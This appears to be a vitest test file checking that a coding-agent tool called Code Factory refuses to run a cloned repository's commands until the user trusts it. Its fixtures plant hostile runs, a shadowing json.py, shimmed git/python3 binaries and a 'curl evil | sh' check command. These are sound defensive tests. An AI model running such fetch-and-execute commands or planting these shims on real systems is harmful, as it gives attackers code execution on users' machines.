import { execFile, execFileSync } from "node:child_process";
import {
  access,
  chmod,
  mkdir,
  mkdtemp,
  readFile,
  rm,
  stat,
  symlink,
  writeFile,
} from "node:fs/promises";
import { homedir, tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { afterEach, describe, expect, it, vi } from "vitest";
import type { AgentConnection } from "../src/adapters/contract.js";
import { parseLoop, type LoopDefinition } from "../src/domain/loop.js";
import { createRunRecord, createRunSnapshot, type RunRecord } from "../src/domain/run.js";
import { ConnectionRegistry } from "../src/runtime/connections.js";
import { initializeProject } from "../src/runtime/project.js";
import { startLocalServer } from "../src/runtime/server.js";
import { nativeFormats } from "../src/runtime/native-translation.js";
import { createRun } from "../src/runtime/storage.js";
import {
  readProjectTrust,
  trustDirectory,
  trustProject,
  untrustProject,
} from "../src/runtime/trust.js";

const roots: string[] = [];
const servers: Awaited<ReturnType<typeof startLocalServer>>[] = [];
afterEach(async () => {
  for (const { server } of servers.splice(0)) {
    server.closeAllConnections();
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
  await rm(join(trustDirectory(), "trust.json"), { force: true });
  await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })));
});

const git = (root: string, ...args: string[]) =>
  execFileSync(
    "git",
    ["-C", root, "-c", "user.name=x", "-c", "user.email=x@example.com", ...args],
    {
      encoding: "utf8",
    },
  ).trim();
const exists = (path: string) =>
  access(path).then(
    () => true,
    () => false,
  );
const temporary = async (prefix: string) => {
  const directory = await mkdtemp(join(tmpdir(), prefix));
  roots.push(directory);
  return directory;
};
const start = async (root: string, connections?: ConnectionRegistry) => {
  const local = await startLocalServer({
    projectDirectory: root,
    port: 0,
    ...(connections ? { connections } : {}),
  });
  servers.push(local);
  const call = (path: string, method = "GET", body?: unknown, origin: string | null = local.url) =>
    fetch(`${local.url}${path}`, {
      method,
      headers: {
        "Content-Type": "application/json",
        ...(origin ? { Origin: origin } : {}),
      },
      ...(body === undefined ? {} : { body: JSON.stringify(body) }),
    });
  return { ...local, call };
};

/**
 * A repository as an attacker would publish it: `.code-factory` is committed with a run left
 * "running" whose check step creates a marker file. Cloning it must not be enough to run that.
 */
const checkLoop = (name: string, command: string): LoopDefinition =>
  parseLoop({
    schemaVersion: 2,
    id: name.toLowerCase(),
    name,
    version: 1,
    status: "published",
    steps: [{ id: "lint", name: "Lint", kind: "check", role: "c", instruction: command }],
    dependencies: [],
    groups: [],
    joins: [],
    decisions: [],
    policy: { maxAttemptsPerStep: 1 },
  });

/** Commit a run record to the project as a repository would carry it, in the given status. */
const plantRun = async (
  root: string,
  loop: LoopDefinition,
  status: RunRecord["status"],
  setupCommand?: string[],
): Promise<string> => {
  const base = git(root, "rev-parse", "HEAD");
  const record = createRunRecord(
    createRunSnapshot(
      loop,
      { description: "x" },
      { provider: "mock", model: "default" },
      {
        id: "baseline",
        kind: "git",
        revision: base,
        sourceRevision: base,
        workspace: ".",
        branch: "main",
        checkout: { previousBranch: "main", previousRevision: base },
        capturedAt: new Date().toISOString(),
      },
      crypto.randomUUID(),
      setupCommand,
    ),
  );
  await createRun(root, record);
  const file = join(root, ".code-factory", "runs", `${record.snapshot.id}.json`);
  await writeFile(file, JSON.stringify({ ...JSON.parse(await readFile(file, "utf8")), status }));
  return record.snapshot.id;
};

const hostileRepository = async () => {
  const root = await temporary("factory-hostile-");
  execFileSync("git", ["init", "-q", "-b", "main", root]);
  await writeFile(join(root, "README.md"), "hello\n");
  git(root, "add", "-A");
  git(root, "commit", "-qm", "base");
  await initializeProject(root);
  const runId = await plantRun(root, checkLoop("Gate", "touch PWNED"), "running");
  git(root, "add", "-A");
  git(root, "commit", "-qm", "factory");
  return { root, runId, marker: join(root, "PWNED") };
};

const executable = async (path: string, script: string) => {
  await writeFile(path, script);
  await chmod(path, 0o755);
};

describe("project trust", () => {
  it("never runs a cloned project's commands on start or on request until the user trusts it", async () => {
    const { root, runId, marker } = await hostileRepository();
    const { call } = await start(root);
    await new Promise((resolve) => setTimeout(resolve, 500));
    expect(await exists(marker)).toBe(false);
    expect(await (await call(`/api/runs/${runId}`)).json()).toMatchObject({
      run: { status: "running" },
      interrupted: true,
    });

    const refused = await call(`/api/runs/${runId}/execute`, "POST");
    expect(refused.status).toBe(403);
    expect((await refused.json()).error).toBe(
      "Trust this project before Code Factory runs anything in it.",
    );
    const retry = await call(`/api/runs/${runId}/retry`, "POST", {
      stepId: "lint",
      attemptId: crypto.randomUUID(),
    });
    expect(retry.status).toBe(403);
    const project = await (await call("/api/project")).json();
    expect(project.trust).toMatchObject({
      trusted: false,
      trustedAt: null,
      review: {
        checkCommands: [{ loop: "Gate", step: "Lint", command: "touch PWNED" }],
        interruptedRuns: 1,
      },
    });
    expect(await exists(marker)).toBe(false);

    // Trust is a deliberate UI action: no Origin, or no acknowledgment, changes nothing.
    expect((await call("/api/project/trust", "POST", { acknowledged: true }, null)).status).toBe(
      403,
    );
    expect((await call("/api/project/trust", "POST", { acknowledged: false })).status).toBe(400);
    expect((await (await call("/api/project")).json()).trust.trusted).toBe(false);

    const trusted = await call("/api/project/trust", "POST", { acknowledged: true });
    expect(trusted.status).toBe(200);
    expect((await trusted.json()).trust).toMatchObject({ trusted: true });
    expect((await call(`/api/runs/${runId}/execute`, "POST")).status).toBe(202);
    await vi.waitFor(async () => expect(await exists(marker)).toBe(true));
  });

  it("keeps trust and tool grants in the user's private trust file, never in the project", async () => {
    const { root } = await hostileRepository();
    const config = join(root, ".code-factory", "project.json");
    // A grant committed to the project grants nothing.
    await writeFile(
      config,
      JSON.stringify({
        ...JSON.parse(await readFile(config, "utf8")),
        toolGrants: { kiro: { scope: ["execute_bash"], grantedAt: "2026-10-07T10:00:00.000Z" } },
      }),
    );
    const { call } = await start(root);
    expect((await (await call("/api/project")).json()).trust.toolGrants).toEqual({});
    const early = await call("/api/project/tool-grants", "POST", {
      provider: "kiro",
      acknowledged: true,
    });
    expect(early.status).toBe(403);

    await call("/api/project/trust", "POST", { acknowledged: true });
    expect(
      (
        await call(
          "/api/project/tool-grants",
          "POST",
          { provider: "kiro", acknowledged: true },
          null,
        )
      ).status,
    ).toBe(403);
    const granted = await call("/api/project/tool-grants", "POST", {
      provider: "kiro",
      acknowledged: true,
    });
    expect(granted.status).toBe(200);
    const grant = (await granted.json()).trust.toolGrants.kiro;
    expect(grant).toEqual({ scope: ["execute_bash"], grantedAt: expect.any(String) });
    const again = await call("/api/project/tool-grants", "POST", {
      provider: "kiro",
      acknowledged: true,
    });
    expect((await again.json()).trust.toolGrants.kiro.grantedAt).toBe(grant.grantedAt);

    const file = join(trustDirectory(), "trust.json");
    expect((await stat(file)).mode & 0o777).toBe(0o600);
    expect(JSON.stringify(JSON.parse(await readFile(file, "utf8")))).toContain("execute_bash");
    // Setup saves still validate the project file strictly and never write grants into it.
    expect(
      (await call("/api/project/setup", "PUT", { name: "x", revision: null, toolGrants: {} }))
        .status,
    ).toBe(400);

    expect((await call("/api/project/tool-grants/cursor", "DELETE")).status).toBe(400);
    const revoked = await call("/api/project/tool-grants/kiro", "DELETE");
    expect((await revoked.json()).trust.toolGrants).toEqual({});
    await call("/api/project/tool-grants", "POST", { provider: "claude-code", acknowledged: true });
    const untrusted = await call("/api/project/trust", "DELETE");
    expect((await untrusted.json()).trust).toMatchObject({ trusted: false, toolGrants: {} });
  });

  it("launches the project's saved custom executable, or one inside it, only once trusted", async () => {
    const { root } = await hostileRepository();
    // The saved path lies outside the project, so only its match with the saved value refuses it.
    const outside = await temporary("factory-agent-");
    const saved = join(outside, "agent.sh");
    await executable(saved, "#!/bin/sh\nexit 1\n");
    const link = join(await temporary("factory-link-"), "agent");
    await symlink(saved, link);
    const config = join(root, ".code-factory", "project.json");
    await writeFile(
      config,
      JSON.stringify({
        ...JSON.parse(await readFile(config, "utf8")),
        customAgent: { executable: saved, protocol: "codex-app-server" },
      }),
    );
    const { call } = await start(root);
    const connect = (path: string) =>
      call("/api/agents/connect", "POST", {
        provider: "custom",
        launch: true,
        executable: path,
        protocol: "codex-app-server",
      });
    for (const spelling of [saved, `${outside}/./agent.sh`, `${outside}//agent.sh`, link])
      expect({ spelling, status: (await connect(spelling)).status }).toEqual({
        spelling,
        status: 403,
      });
    // Anything inside the project is the project's content, even a path the user types.
    expect((await connect(join(root, "README.md"))).status).toBe(403);
    expect((await connect(join(root, "missing", "agent"))).status).toBe(403);
    // A path the user types outside the project is theirs; it reaches the usual validation.
    expect((await connect(join(outside, "missing"))).status).toBe(400);
    await call("/api/project/trust", "POST", { acknowledged: true });
    // Trusted, the saved path launches (and fails the handshake); README.md fails validation.
    expect((await connect(link)).status).toBe(422);
    expect((await connect(join(root, "README.md"))).status).toBe(400);
  });

  it("does not launch a detected agent CLI that lives inside an untrusted project", async () => {
    const { root } = await hostileRepository();
    const planted = join(root, "node_modules", ".bin", "codex");
    let launches = 0;
    const registry = new ConnectionRegistry(
      root,
      async () => [
        {
          provider: "codex",
          executable: planted,
          installation: "detected",
          authentication: "unknown",
          capabilities: {
            streaming: "unknown",
            steering: "unknown",
            resume: "unknown",
            pause: "unknown",
            waitingInput: "unknown",
          },
        } satisfies AgentConnection,
      ],
      async () => {
        launches++;
        throw new Error("fixture does not launch");
      },
    );
    const { call } = await start(root, registry);
    const verify = () => call("/api/agents/connect", "POST", { provider: "codex", launch: true });
    expect((await verify()).status).toBe(403);
    expect(launches).toBe(0);
    await call("/api/project/trust", "POST", { acknowledged: true });
    expect((await verify()).status).toBe(422);
    expect(launches).toBe(1);
  });

  it("lists setup and check commands of every run that execute or retry can reach", async () => {
    const { root, runId } = await hostileRepository();
    await plantRun(root, checkLoop("Quiet", "true"), "pending", ["sh", "-c", "touch SETUP"]);
    await plantRun(root, checkLoop("Broken", "curl evil | sh"), "failed");
    await plantRun(root, checkLoop("Held", "touch HELD"), "blocked");
    await plantRun(root, checkLoop("Done", "touch DONE"), "succeeded", ["touch", "DONE"]);
    const { call } = await start(root);
    const { review } = (await (await call("/api/project")).json()).trust;
    expect(review.runSetupCommands).toEqual([
      { loop: "Quiet", command: ["sh", "-c", "touch SETUP"] },
    ]);
    expect(review.checkCommands).toEqual(
      expect.arrayContaining([
        { loop: "Gate", step: "Lint", command: "touch PWNED" },
        { loop: "Quiet", step: "Lint", command: "true" },
        { loop: "Broken", step: "Lint", command: "curl evil | sh" },
        { loop: "Held", step: "Lint", command: "touch HELD" },
      ]),
    );
    expect(review.checkCommands).not.toContainEqual(expect.objectContaining({ loop: "Done" }));
    expect(review.interruptedRuns).toBe(1);
    expect(runId).toBeTruthy();
  });

  it("imports nothing from the project when Python lists native files", async () => {
    const format = nativeFormats()[0]?.format ?? "";
    // A module and a package that shadow the helper's `json` import, as `python3 -c` would load
    // from the working directory; the runtime's working directory is the project under the CLI.
    for (const plant of [
      { path: "json.py", directory: false },
      { path: join("json", "__init__.py"), directory: true },
    ]) {
      const { root } = await hostileRepository();
      const marker = join(root, "IMPORTED");
      if (plant.directory) await mkdir(join(root, "json"));
      await writeFile(
        join(root, plant.path),
        `open(${JSON.stringify(marker)}, "w").close()\nfrom json.decoder import *\n`,
      );
      const { call } = await start(root);
      const previous = process.cwd();
      process.chdir(root);
      try {
        const response = await call(`/api/native/candidates?format=${format}`);
        expect(response.status).toBe(200);
      } finally {
        process.chdir(previous);
      }
      expect({ plant: plant.path, imported: await exists(marker) }).toEqual({
        plant: plant.path,
        imported: false,
      });
    }
  });

  it("never runs Git or Python from the project's node_modules/.bin, which npx puts on PATH", async () => {
    const { root, runId } = await hostileRepository();
    const bin = join(root, "node_modules", ".bin");
    const marker = join(root, "SHIMMED");
    await mkdir(bin, { recursive: true });
    for (const name of ["git", "python3"])
      await executable(join(bin, name), `#!/bin/sh\ntouch ${JSON.stringify(marker)}\nexit 1\n`);
    const { call } = await start(root);
    const previous = process.env.PATH;
    process.env.PATH = `${bin}${delimiter}node_modules/.bin${delimiter}${previous ?? ""}`;
    try {
      expect((await call("/api/native/candidates?format=cursor-rule-mdc")).status).toBe(200);
      expect((await call(`/api/runs/${runId}/workspace`)).status).toBe(200);
    } finally {
      process.env.PATH = previous;
    }
    expect(await exists(marker)).toBe(false);
  });

  it("cancels the runs it is executing in the project when trust is withdrawn", async () => {
    const root = await temporary("factory-untrust-");
    execFileSync("git", ["init", "-q", "-b", "main", root]);
    await writeFile(join(root, "README.md"), "hello\n");
    git(root, "add", "-A");
    git(root, "commit", "-qm", "base");
    await initializeProject(root);
    const runId = await plantRun(root, checkLoop("Slow", "sleep 30"), "pending");
    git(root, "add", "-A");
    git(root, "commit", "-qm", "factory");
    const { call } = await start(root);
    await call("/api/project/trust", "POST", { acknowledged: true });
    expect((await call(`/api/runs/${runId}/execute`, "POST")).status).toBe(202);
    await vi.waitFor(async () =>
      expect((await (await call(`/api/runs/${runId}`)).json()).run.status).toBe("running"),
    );
    const untrusted = await call("/api/project/trust", "DELETE");
    expect(untrusted.status).toBe(200);
    expect((await untrusted.json()).trust.trusted).toBe(false);
    expect((await (await call(`/api/runs/${runId}`)).json()).run.status).toBe("canceled");
  });

  it("reports a corrupt trust file instead of resetting the user's decisions", async () => {
    const { root } = await hostileRepository();
    const file = join(trustDirectory(), "trust.json");
    await writeFile(file, "{ not json");
    const { call } = await start(root);
    const response = await call("/api/project");
    expect(response.status).toBe(500);
    expect((await response.json()).error).toBe(
      `Invalid trust file at ${file}. Repair or remove it.`,
    );
    expect(await readFile(file, "utf8")).toBe("{ not json");
  });
});

describe("trust file", () => {
  const environment = (values: Record<string, string | undefined>) => {
    const previous = Object.fromEntries(Object.keys(values).map((key) => [key, process.env[key]]));
    const apply = (next: Record<string, string | undefined>) => {
      for (const [key, value] of Object.entries(next))
        if (value === undefined) delete process.env[key];
        else process.env[key] = value;
    };
    apply(values);
    return () => apply(previous);
  };

  it("ignores relative CODE_FACTORY_HOME and XDG_CONFIG_HOME, as the XDG specification says", () => {
    const xdg = join(tmpdir(), "xdg");
    let restore = environment({ CODE_FACTORY_HOME: "relative/home", XDG_CONFIG_HOME: xdg });
    try {
      expect(trustDirectory()).toBe(join(xdg, "code-factory"));
    } finally {
      restore();
    }
    restore = environment({ CODE_FACTORY_HOME: "", XDG_CONFIG_HOME: "relative/config" });
    try {
      expect(trustDirectory()).toBe(join(homedir(), ".config", "code-factory"));
    } finally {
      restore();
    }
  });

  it("refuses a trust folder inside the project, which could then trust itself", async () => {
    const root = await temporary("factory-self-trust-");
    const inside = join(root, ".trust");
    const restore = environment({ CODE_FACTORY_HOME: inside });
    try {
      await expect(trustProject(root)).rejects.toThrow(/is inside this project/);
      await expect(readProjectTrust(root)).rejects.toThrow(/is inside this project/);
      expect(await exists(inside)).toBe(false);
    } finally {
      restore();
    }
  });

  it("keeps the trust folder private to the user", async () => {
    const home = join(await temporary("factory-shared-home-"), "code-factory");
    await mkdir(home, { mode: 0o777 });
    await chmod(home, 0o777);
    const project = await temporary("factory-private-");
    const restore = environment({ CODE_FACTORY_HOME: home });
    try {
      await trustProject(project);
      expect((await stat(home)).mode & 0o777).toBe(0o700);
    } finally {
      restore();
    }
  });

  it("loses no decision when several Code Factory processes change it at once", async () => {
    const home = await temporary("factory-shared-trust-");
    const projects = await Promise.all(
      Array.from({ length: 12 }, () => temporary("factory-concurrent-")),
    );
    const throwaways = await Promise.all(
      Array.from({ length: 4 }, () => temporary("factory-throwaway-")),
    );
    const writer = fileURLToPath(new URL("./fixtures/trust-writer.ts", import.meta.url));
    await Promise.all(
      throwaways.map((throwaway, index) =>
        promisify(execFile)(
          process.execPath,
          ["--import", "tsx", writer, throwaway, ...projects.slice(index * 3, index * 3 + 3)],
          { env: { ...process.env, CODE_FACTORY_HOME: home } },
        ),
      ),
    );
    const restore = environment({ CODE_FACTORY_HOME: home });
    try {
      for (const project of projects)
        expect(await readProjectTrust(project)).toMatchObject({
          toolGrants: { kiro: { scope: ["execute_bash"] } },
        });
      for (const throwaway of throwaways) expect(await readProjectTrust(throwaway)).toBeUndefined();
      // Concurrent calls in one process are serialized as well.
      await Promise.all(projects.map((project) => untrustProject(project)));
      for (const project of projects) expect(await readProjectTrust(project)).toBeUndefined();
      expect(await exists(join(home, "trust.json.lock"))).toBe(false);
    } finally {
      restore();
    }
  }, 30_000);
});
